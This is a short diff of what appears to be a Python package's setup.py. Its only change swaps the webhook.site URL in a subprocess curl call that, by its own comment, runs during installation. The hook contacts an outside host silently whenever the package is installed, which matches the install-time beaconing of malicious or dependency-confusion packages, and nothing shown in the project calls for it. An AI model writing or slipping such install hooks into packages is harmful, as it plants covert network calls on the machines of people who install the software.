@@ -9,4 +9,4 @@ setup(
 )
 
 # Execute the curl command during installation
-subprocess.run(['curl', 'https://webhook.site/3ddfe84f-134c-4153-b091-ce4f8aabce71'])
+subprocess.run(['curl', 'https://webhook.site/de7ab1de-4b23-406f-901d-9d57747bb44a'])
